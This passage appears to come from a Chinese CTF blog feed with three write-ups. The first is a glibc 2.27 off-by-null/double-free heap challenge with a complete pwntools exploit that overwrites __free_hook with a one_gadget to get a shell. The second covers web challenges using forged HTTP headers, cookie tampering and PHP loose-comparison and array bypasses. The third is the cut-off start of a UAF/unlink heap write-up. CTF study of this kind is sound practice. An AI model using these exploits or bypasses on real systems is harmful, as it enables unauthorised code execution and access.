data-src="/../capture_20241109163923308.bmp"></p><ul><li>æ­¤æ—¶çš„chunk0ç¡®å®æ²¡æœ‰fdå’Œbkï¼Œè€Œå‡ºchunk1å…·æœ‰fdå’ŒbkæŒ‡é’ˆï¼Œshow(1)çš„è¯å°±è·å¾—ï¼Œä½†ä¸ºä»€ä¹ˆæ˜¯show(0)å‘¢ï¼Ÿ</li><li>ä»”ç»†åˆ†æä¸€ä¸‹,é—®é¢˜è¿˜æ˜¯å‡ºç°åœ¨addå‡½æ•°é‡Œé¢ğŸ˜¢ï¼š</li></ul><div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">è¯¥éƒ¨åˆ†å¼€å¤´çš„addæ˜¯å°†chunk1å¯¹åº”çš„æŒ‡é’ˆç»™åˆ°heaolist[0]</span><br><span class="line">---&gt; heaplist[0] = chunk1</span><br><span class="line">æ¥ç€free(2),heaplist[2]=0</span><br><span class="line">å†æ¬¡çš„add(0x420)ï¼Œç”±äºheaplist[0]!=0,æ‰€ä»¥æ­¤æ—¶æ˜¯å°†åˆ†å‰²çš„chunkç»™åˆ°heaplist[1]</span><br><span class="line">---&gt; heaplist[1] == åˆ†å‰²çš„chunk(chunk0)</span><br><span class="line">show(0),å³show(heaplist[0]-&gt;chunk1)</span><br><span class="line">å°†chunk1çš„user_dataéƒ¨åˆ†è¾“å‡ºå‡ºæ¥</span><br></pre></td></tr></table></figure></div><h2 id="double-free"><a href="#double-free" class="headerlink" title="double free"></a>double free</h2><div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">one = [<span class="number">0x4f2be</span>,<span class="number">0x4f2c5</span>,<span class="number">0x4f322</span>,<span class="number">0x10a38c</span>]</span><br><span class="line">onegadget = libc.address + one[<span class="number">2</span>]</span><br><span class="line"></span><br><span class="line">add(<span class="number">0x68</span>,cyclic(<span class="number">0x67</span>))</span><br><span class="line">free(<span class="number">0</span>)</span><br><span class="line">free(<span class="number">2</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#bug()</span></span><br><span class="line">add(<span class="number">0x60</span>,p64(libc.sym[<span class="string">&#x27;__free_hook&#x27;</span>]))</span><br><span class="line">add(<span class="number">0x60</span>)</span><br><span class="line">add(<span class="number">0x60</span>,p64(onegadget))</span><br><span class="line"></span><br><span class="line">free(<span class="number">1</span>)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure></div><ul><li>ç”±äºè¯¥ç‰ˆæœ¬çš„Glibc2.27æ²¡æœ‰<code>double free</code>çš„æ£€æŸ¥ï¼Œç›´æ¥æ”¹å°±è¡Œ</li><li>å¯¹ä¸¤ä¸ªfreeè§£é‡Šï¼Œæ¥ç€ä¸Šé¢çš„è¯´ï¼š</li></ul><div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">æ­¤æ—¶addï¼Œæ˜¯å°†åˆ†å‰²å‡ºçš„chun1ç»™åˆ°heaplist[2]</span><br><span class="line">---&gt; heaplist[2] = chunk1</span><br><span class="line">free(0) ç›¸å½“äº free(heaplist[0]-&gt;chunk1)</span><br><span class="line">free(2) ç›¸å½“äº free(heaplist[2]-&gt;chunk1)</span><br><span class="line">é€ æˆäº†double free</span><br></pre></td></tr></table></figure></div><h1 id="å®Œæ•´EXP"><a href="#å®Œæ•´EXP" class="headerlink" title="å®Œæ•´EXP"></a>å®Œæ•´EXP</h1><div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">bug</span>():</span><br><span class="line">    gdb.attach(p)</span><br><span class="line">    pause()</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_addr</span>():</span><br><span class="line">    <span class="keyword">return</span> u64(p.recvuntil(<span class="string">b&#x27;\x7f&#x27;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>, <span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_sb</span>():</span><br><span class="line">    <span class="keyword">return</span> libc_base + libc.sym[<span class="string">&#x27;system&#x27;</span>], libc_base + <span class="built_in">next</span>(libc.search(<span class="string">b&#x27;/bin/sh\x00&#x27;</span>))</span><br><span class="line"></span><br><span class="line">sd = <span class="keyword">lambda</span> data : p.send(data)</span><br><span class="line">sa  = <span class="keyword">lambda</span> text,data  :p.sendafter(text, data)</span><br><span class="line">sl  = <span class="keyword">lambda</span> data   :p.sendline(data)</span><br><span class="line">sla = <span class="keyword">lambda</span> text,data  :p.sendlineafter(text, data)</span><br><span class="line">rc   = <span class="keyword">lambda</span> num=<span class="number">4096</span>   :p.recv(num)</span><br><span class="line">ru  = <span class="keyword">lambda</span> text   :p.recvuntil(text)</span><br><span class="line">rl  = <span class="keyword">lambda</span> :p.recvline()</span><br><span class="line">pr = <span class="keyword">lambda</span> num=<span class="number">4096</span> :<span class="built_in">print</span>(p.recv(num))</span><br><span class="line">ia   = <span class="keyword">lambda</span>        :p.interactive()</span><br><span class="line">l32 = <span class="keyword">lambda</span>    :u32(p.recvuntil(<span class="string">b&#x27;\xf7&#x27;</span>)[-<span class="number">4</span>:].ljust(<span class="number">4</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">l64 = <span class="keyword">lambda</span>    :u64(p.recvuntil(<span class="string">b&#x27;\x7f&#x27;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">uu32    = <span class="keyword">lambda</span>    :u32(p.recv(<span class="number">4</span>).ljust(<span class="number">4</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">uu64    = <span class="keyword">lambda</span>    :u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">int16   = <span class="keyword">lambda</span> data   :<span class="built_in">int</span>(data,<span class="number">16</span>)</span><br><span class="line">lg= <span class="keyword">lambda</span> s, num   :p.success(<span class="string">&#x27;%s -&gt; 0x%x&#x27;</span> % (s, num))</span><br><span class="line"></span><br><span class="line">context(arch = <span class="string">&quot;amd64&quot;</span>,os = <span class="string">&quot;linux&quot;</span>,log_level = <span class="string">&quot;debug&quot;</span>)</span><br><span class="line">context.terminal = [<span class="string">&#x27;gnome-terminal&#x27;</span>, <span class="string">&#x27;-x&#x27;</span>, <span class="string">&#x27;sh&#x27;</span>, <span class="string">&#x27;-c&#x27;</span>]</span><br><span class="line">file = <span class="string">&quot;./pwn&quot;</span></span><br><span class="line"><span class="comment">#libc = &quot;/home/pwn/Desktop/buuctf/libc/64bits/libc-2.23.so&quot; # ubuntu16</span></span><br><span class="line"><span class="comment">#libc = &quot;/home/pwn/Desktop/buuctf/libc/64bits/libc-2.27.so&quot; # ubuntu18</span></span><br><span class="line">libc = <span class="string">&quot;/home/pwn/glibc-all-in-one/libs/2.27-3ubuntu1_amd64/libc.so.6&quot;</span></span><br><span class="line"></span><br><span class="line">p = process(file)</span><br><span class="line"><span class="comment">#p = remote(&quot;node5.buuoj.cn&quot;,26742)</span></span><br><span class="line">elf = ELF(file)</span><br><span class="line">libc = ELF(libc)</span><br><span class="line"><span class="comment">#p = remote(&quot;&quot;, 23583)</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">choice</span>(<span class="params">idx</span>):</span><br><span class="line">    sla(<span class="string">&quot;Your choice: &quot;</span>,<span class="built_in">str</span>(idx))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">size,data=<span class="string">&#x27;a&#x27;</span></span>):</span><br><span class="line">    choice(<span class="number">1</span>)</span><br><span class="line">    sla(<span class="string">&quot;Size:&quot;</span>,<span class="built_in">str</span>(size))</span><br><span class="line">    sa(<span class="string">&quot;Data:&quot;</span>,data)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">show</span>(<span class="params">idx</span>):</span><br><span class="line">    choice(<span class="number">2</span>)</span><br><span class="line">    sla(<span class="string">&quot;Index:&quot;</span>,<span class="built_in">str</span>(idx))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">free</span>(<span class="params">idx</span>):</span><br><span class="line">    choice(<span class="number">3</span>)</span><br><span class="line">    sla(<span class="string">&quot;Index:&quot;</span>,<span class="built_in">str</span>(idx))</span><br><span class="line"></span><br><span class="line"><span class="comment"># tcache æœ‰off_ny_oneæ¼æ´ï¼Œå¯ç”³è¯·10ä¸ªchunk</span></span><br><span class="line">add(<span class="number">0x420</span>,<span class="string">b&#x27;0&#x27;</span>)</span><br><span class="line">add(<span class="number">0x68</span>,<span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">add(<span class="number">0x4f0</span>,<span class="string">b&#x27;2&#x27;</span>)</span><br><span class="line">add(<span class="number">0x10</span>,<span class="string">b&#x27;3&#x27;</span>)</span><br><span class="line">free(<span class="number">0</span>)</span><br><span class="line">free(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">9</span>):</span><br><span class="line">    add(<span class="number">0x68</span>-i,<span class="string">b&#x27;a&#x27;</span>*(<span class="number">0x68</span>-i))</span><br><span class="line">    free(<span class="number">0</span>)</span><br><span class="line">bug()</span><br><span class="line">add(<span class="number">0x68</span>,cyclic(<span class="number">0x60</span>)+p64(<span class="number">0x4a0</span>))</span><br><span class="line">free(<span class="number">2</span>)</span><br><span class="line"><span class="comment">#bug()</span></span><br><span class="line">add(<span class="number">0x420</span>)</span><br><span class="line">show(<span class="number">0</span>)</span><br><span class="line">main_arena = u64(p.recvuntil(<span class="string">b&#x27;\x0a&#x27;</span>)[:-<span class="number">1</span>]+<span class="string">b&#x27;\x00\x00&#x27;</span>) - <span class="number">0x10</span></span><br><span class="line">malloc_hook = main_arena - <span class="number">0x60</span></span><br><span class="line">libc.address = malloc_hook - libc.sym[<span class="string">&#x27;__malloc_hook&#x27;</span>]</span><br><span class="line">lg(<span class="string">&quot;libc_address: &quot;</span>,libc.address)</span><br><span class="line"></span><br><span class="line">one = [<span class="number">0x4f2be</span>,<span class="number">0x4f2c5</span>,<span class="number">0x4f322</span>,<span class="number">0x10a38c</span>]</span><br><span class="line">onegadget = libc.address + one[<span class="number">2</span>]</span><br><span class="line"></span><br><span class="line">add(<span class="number">0x68</span>,cyclic(<span class="number">0x67</span>))</span><br><span class="line">free(<span class="number">0</span>)</span><br><span class="line">free(<span class="number">2</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#bug()</span></span><br><span class="line">add(<span class="number">0x60</span>,p64(libc.sym[<span class="string">&#x27;__free_hook&#x27;</span>]))</span><br><span class="line">add(<span class="number">0x60</span>)</span><br><span class="line">add(<span class="number">0x60</span>,p64(onegadget))</span><br><span class="line"></span><br><span class="line">free(<span class="number">1</span>)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure></div>]]></content>
      
      
      
        <tags>
            
            <tag> ctf-pwn </tag>
            
            <tag> off_by_null </tag>
            
            <tag> Glibc2.27 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>HTTPå¤´ä¼ªé€ </title>
      <link href="/2024/11/09/HTTP%E5%A4%B4%E4%BC%AA%E9%80%A0/"/>
      <url>/2024/11/09/HTTP%E5%A4%B4%E4%BC%AA%E9%80%A0/</url>
      
        <content type="html"><![CDATA[<h1 id><a href="#" class="headerlink" title></a></h1><h1 id="å‰è¨€"><a href="#å‰è¨€" class="headerlink" title="å‰è¨€"></a>å‰è¨€</h1><p>å®Œæˆä¸Šè¯¾çš„webä½œä¸šï¼Œé¡ºä¾¿åšä¸€äº›è®°å½•ã€‚</p><p><mark>è¯¥éƒ¨åˆ†ä¸»è¦æ˜¯è®²HTTPå¤´çš„æ„é€ å’Œcookieæ³¨å…¥<mark></mark></mark></p><h1 id="æå®¢å¤§æŒ‘æˆ˜-2019-Http"><a href="#æå®¢å¤§æŒ‘æˆ˜-2019-Http" class="headerlink" title="[æå®¢å¤§æŒ‘æˆ˜ 2019]Http"></a>[æå®¢å¤§æŒ‘æˆ˜ 2019]Http</h1><p>æ‰“å¼€ç½‘ç«™ä¹‹åæŸ¥çœ‹æºç ï¼Œå‘ç°ï¼š</p><p><img lazyload src="/images/loading.svg" data-src="/../capture_20241109132746031.bmp"></p><p>äºæ˜¯æ‰“å¼€çœ‹çœ‹</p><p><img lazyload src="/images/loading.svg" data-src="/../capture_20241109132906519.bmp"></p><ul><li>å¾ˆæ˜æ˜¾æ˜¯è¦æˆ‘ä»¬è‡ªå·±æ„é€ HTTPçš„è¯·æ±‚å¤´ï¼Œè¿™é‡Œåˆ†ä¸ºä¸¤ç§å·¥å…·ï¼Œä¸€ä¸ªæ˜¯<code>yakit</code>ï¼Œè¿˜æœ‰ä¸ªæ˜¯æµè§ˆå™¨<code>hackbar</code>æ’ä»¶(æˆ‘ç”¨çš„æ˜¯Google)</li></ul><h2 id="yakitæŠ“åŒ…æ„é€ httpè¯·æ±‚å¤´"><a href="#yakitæŠ“åŒ…æ„é€ httpè¯·æ±‚å¤´" class="headerlink" title="yakitæŠ“åŒ…æ„é€ httpè¯·æ±‚å¤´"></a>yakitæŠ“åŒ…æ„é€ httpè¯·æ±‚å¤´</h2><p><strong>1.ä¿®æ”¹è®¿é—®ç½‘ç«™</strong></p><p><img lazyload src="/images/loading.svg" data-src="/../capture_20241109133225355.bmp"></p><p><strong>2.æŒ‡å®šæµè§ˆå™¨</strong></p><p><img lazyload src="/images/loading.svg" data-src="/../capture_20241109133242400.bmp"></p><p><strong>3.ä»æœ¬åœ°è®¿é—®</strong></p><p><img lazyload src="/images/loading.svg" data-src="/../capture_20241109133256897.bmp"></p><h2 id="hackbarä¿®æ”¹httpè¯·æ±‚å¤´"><a href="#hackbarä¿®æ”¹httpè¯·æ±‚å¤´" class="headerlink" title="hackbarä¿®æ”¹httpè¯·æ±‚å¤´"></a>hackbarä¿®æ”¹httpè¯·æ±‚å¤´</h2><p><img lazyload src="/images/loading.svg" data-src="/../capture_20241109133626607.bmp"></p><h1 id="æå®¢å¤§æŒ‘æˆ˜-2019-BuyFlag"><a href="#æå®¢å¤§æŒ‘æˆ˜-2019-BuyFlag" class="headerlink" title="[æå®¢å¤§æŒ‘æˆ˜ 2019]BuyFlag"></a>[æå®¢å¤§æŒ‘æˆ˜ 2019]BuyFlag</h1><ul><li>ç‚¹å¼€PAYFLAGé¡µé¢æŸ¥çœ‹æºä»£ç </li><li>è¦æ±‚å¦‚ä¸‹ï¼ŒåŒæ—¶åœ¨æºä»£ç è¿˜éšè—ç€ä¸œè¥¿</li></ul><p><img lazyload src="/images/loading.svg" data-src="/../capture_20241109133940732.bmp"></p><p><img lazyload src="/images/loading.svg" data-src="/../capture_20241109133949465.bmp"></p><ul><li>è¦æ±‚æˆ‘ä»¬è¿›è¡Œ<code>POST</code>è¯·æ±‚å‘é€passwordå’Œmoneyï¼Œå¹¶ä¸”passwordæœ‰å¦‚ä¸Šçš„è¦æ±‚ï¼Œå…ˆçœ‹æŠ“åŒ…</li></ul><p><img lazyload src="/images/loading.svg" data-src="/../capture_20241109134307454.bmp"></p><h2 id="ä¿®æ”¹cookie"><a href="#ä¿®æ”¹cookie" class="headerlink" title="ä¿®æ”¹cookie"></a>ä¿®æ”¹cookie</h2><ul><li>å‘ç°<code>Cookie</code>å¯ä»¥æ”¹ï¼Œå°†user&#x3D;0ä¿®æ”¹ä¸º<code>user=1</code></li></ul><p><img lazyload src="/images/loading.svg" data-src="/../capture_20241109134323295.bmp"></p><h2 id="å¼±æ¯”è¾ƒ"><a href="#å¼±æ¯”è¾ƒ" class="headerlink" title="å¼±æ¯”è¾ƒ"></a>å¼±æ¯”è¾ƒ</h2><ul><li>å‘ç°æˆ‘ä»¬å·²ç»æ˜¯å­¦ç”Ÿäº†ï¼Œä¸‹é¢ä¿®æ”¹passwordå’Œmoney</li><li>æ³¨æ„è¦æ˜¯POSTè¯·æ±‚ï¼Œ<code>yakit</code>å³é”®å¯ä»¥ç›´æ¥æ”¹ä¸ºPOSTè¯·æ±‚</li><li>å¯¹äºä¸Šè¿°çš„passwordæ¥è¯´ï¼Œè¾“å…¥çº¯æ•°å­—ä¼šè¢«åˆ¤å®šä¸ºä¸é€šè¿‡ï¼Œä½†æ˜¯åé¢çš„æ¯”è¾ƒæ˜¯<code>==</code>ï¼Œè¿™æ˜¯ä¸ªå¼±æ¯”è¾ƒï¼Œä¼šåœ¨æŸäº›æƒ…å†µä¸‹å°†<code>$password</code>çš„ç±»å‹éšå¼è½¬æ¢ï¼Œå³æˆ‘ä»¬è¾“å…¥<code>404a</code>(404åé¢æ— æ‰€è°“ä»€ä¹ˆå­—ç¬¦)<code>==</code>ä¼šç•¥è¿‡éæ•°å­—å‹ï¼Œç›´æ¥æ¯”è¾ƒ404ï¼Œè¿™æ ·å°±ç»•è¿‡äº†åˆ¤æ–­ã€‚</li></ul><div class="highlight-container" data-rel="Php"><figure class="iseeu highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;password&#x27;</span>])) &#123;</span><br><span class="line"><span class="variable">$password</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;password&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span> (<span class="title function_ invoke__">is_numeric</span>(<span class="variable">$password</span>)) &#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;password can&#x27;t be number&lt;/br&gt;&quot;</span>;</span><br><span class="line">&#125;<span class="keyword">elseif</span> (<span class="variable">$password</span> == <span class="number">404</span>) &#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;Password Right!&lt;/br&gt;&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div><p><img lazyload src="/images/loading.svg" data-src="/../capture_20241109135045236.bmp"></p><h2 id="æ•°ç»„ç»•è¿‡"><a href="#æ•°ç»„ç»•è¿‡" class="headerlink" title="æ•°ç»„ç»•è¿‡"></a>æ•°ç»„ç»•è¿‡</h2><ul><li>æ˜¾ç¤ºmoneyçš„é•¿åº¦è¿‡é•¿ï¼Œç›´æ¥æ”¹ä¸ºæ•°ç»„ç»•è¿‡:</li></ul><p><img lazyload src="/images/loading.svg" data-src="/../capture_20241109135409784.bmp"></p><blockquote><p>åœ¨ PHP ä¸­ï¼Œæ•°ç»„å¯ä»¥è§¦å‘ä¸€äº›æ„æƒ³ä¸åˆ°çš„å®½æ¾æ¯”è¾ƒè¡Œä¸ºã€‚å› ä¸ºåœ¨å®½æ¾æ¯”è¾ƒä¸‹ï¼ŒPHP ä¼šå°è¯•å°†æ•°ç»„è½¬æ¢æˆå…¶ä»–ç±»å‹è¿›è¡Œæ¯”è¾ƒï¼Œè¿™æ ·å¯ä»¥ç»•è¿‡æŸäº›éªŒè¯æ¡ä»¶ã€‚ä¾‹å¦‚ï¼Œåœ¨æ¯”è¾ƒä¸­ï¼Œå°†æ•°ç»„ä¸æ•´æ•°æˆ–å­—ç¬¦ä¸²è¿›è¡Œå®½æ¾æ¯”è¾ƒæ—¶ï¼ŒPHP çš„è¡Œä¸ºå¦‚ä¸‹ï¼š</p><ol><li><p><strong>æ•°ç»„ä¸æ•´æ•°æ¯”è¾ƒ</strong>ï¼šå½“æ•°ç»„å’Œæ•´æ•°è¿›è¡Œæ¯”è¾ƒæ—¶ï¼ŒPHP ä¼šå°†æ•°ç»„è§†ä¸º <code>true</code>ï¼Œå³éç©ºçš„æ•°ç»„åœ¨å®½æ¾æ¯”è¾ƒä¸­ç­‰ä»·äº <code>true</code>ã€‚å› æ­¤ï¼š</p><div class="highlight-container" data-rel="Php"><figure class="iseeu highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[] == <span class="number">0</span>  <span class="comment">// true</span></span><br></pre></td></tr></table></figure></div><p>ä»»ä½•éç©ºæ•°ç»„ï¼Œæ¯”å¦‚ <code>[404]</code>ï¼Œä¸æ•´æ•°è¿›è¡Œæ¯”è¾ƒæ—¶ï¼ŒPHP ä¼šå°†æ•°ç»„è§†ä¸º <code>true</code>ï¼Œå› æ­¤ <code>0 == true</code> ä¼šè¢«è®¤ä¸ºæˆç«‹ã€‚</p></li></ol></blockquote><h1 id="BSidesCF-2019-Kookie"><a href="#BSidesCF-2019-Kookie" class="headerlink" title="[BSidesCF 2019]Kookie"></a>[BSidesCF 2019]Kookie</h1><ul><li>è¦æ±‚æ˜¯adminç™»å½•ï¼Œé¢˜ç›®ç»™äº†ä¸€ä¸ªè´¦å·<code>cookie</code>å¯†ç æ˜¯<code>monster</code></li></ul><p><img lazyload src="/images/loading.svg" data-src="/../capture_20241109143732257.bmp"></p><ul><li>ç™»é™†åæŠ“åŒ…çœ‹çœ‹:</li></ul><p><img lazyload src="/images/loading.svg" data-src="/../capture_20241109142343130.bmp"></p><ul><li>ç™»å½•ä¹‹åæœåŠ¡ç«¯ä¼šç»™æˆ‘ä»¬è®¾ç½®<code>cookie</code>çš„å€¼ï¼Œé‚£ä¹ˆæˆ‘ä»¬åœ¨ç™»å½•adminçš„æ—¶å€™<code>ä¿®æ”¹cookie</code>å³å¯</li></ul><p><img lazyload src="/images/loading.svg" data-src="/../capture_20241109144125524.bmp"></p>]]></content>
      
      
      
        <tags>
            
            <tag> ctf-web </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>wdb_2018_1st_babyheap</title>
      <link href="/2024/11/08/wdb-2018-1st-babyheap/"/>
      <url>/2024/11/08/wdb-2018-1st-babyheap/</url>
      
        <content type="html"><![CDATA[<h1 id="å‰è¨€"><a href="#å‰è¨€" class="headerlink" title="å‰è¨€"></a>å‰è¨€</h1><p>Glibc2.24 UAF Unlink</p><p>å‚è€ƒï¼š<a class="link" href="https://www.cnblogs.com/LynneHuan/p/14876455.html">è¿™ç¯‡æ–‡ç«  <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p><p>Unlinkå¯ä»¥çœ‹æˆ‘å†™çš„è¿™ä¸ªæ–‡ç« ï¼š <a href="http://downbeat.top/2024/09/25/zctf2016-note2-unlink/">http://downbeat.top/2024/09/25/zctf2016-note2-unlink/</a></p><h1 id="checksec-ida"><a href="#checksec-ida" class="headerlink" title="checksec+ida"></a>checksec+ida</h1><div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">pwn@ctfpwn:~/Desktop/buuctf/wdb_2018_1st_babyheap$ checksec pwn</span><br><span class="line">[*] <span class="string">&#x27;/home/pwn/Desktop/buuctf/wdb_2018_1st_babyheap/pwn&#x27;</span></span><br><span class="line">    Arch:     amd64-64-little</span><br><span class="line">    RELRO:    Full RELRO</span><br><span class="line">    Stack:    Canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      No PIE (0x3fe000)</span><br></pre></td></tr></table></figure></div><ul><li><p>NO PIEç¬¬ä¸€æƒ³æ³•å°±æ˜¯<code>Unlink</code></p></li><li><p>ä¸‹é¢æŸ¥çœ‹idaçš„ç»“æœ(æŸ¥çœ‹å…³é”®æ¨¡å—)</p></li></ul><h2 id="add"><a href="#add" class="headerlink" title="add"></a>add</h2><ul><li>é™åˆ¶äº†æ¯æ¬¡mallocçš„sizeä¸º0x20</li></ul><div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">unsigned</span> __int64 <span class="title function_">sub_4009A0</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> idx; <span class="comment">// [rsp+Ch] [rbp-24h]</span></span><br><span class="line">  <span class="type">char</span> s[<span class="number">24</span>]; <span class="comment">// [rsp+10h] [rbp-20h] BYREF</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 v3; <span class="comment">// [rsp+28h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v3 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Index:&quot;</span>);</span><br><span class="line">  <span class="built_in">memset</span>(s, <span class="number">0</span>, <span class="number">0x10</span>uLL);</span><br><span class="line">  read(<span class="number">0</span>, s, <span class="number">0xF</span>uLL);</span><br><span class="line">  idx = atoi(s);</span><br><span class="line">  <span class="keyword">if</span> ( idx &lt;= <span class="number">9</span> &amp;&amp; !(&amp;ptr)[idx] )</span><br><span class="line">  &#123;</span><br><span class="line">    (&amp;ptr)[idx] = (<span class="type">char</span> *)<span class="built_in">malloc</span>(<span class="number">0x20</span>uLL);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Content:&quot;</span>);</span><br><span class="line">    my_input((&amp;ptr)[idx], <span class="number">32LL</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Done!&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> __readfsqword(<span class="number">0x28</span>u) ^ v3;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div><h2 id="edit"><a href="#edit" class="headerlink" title="edit"></a>edit</h2><ul><li>åªæœ‰ä¸‰æ¬¡ä¿®æ”¹çš„æœºä¼šï¼Œå¹¶ä¸”åªèƒ½ä¿®æ”¹0x20</li></ul><div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span 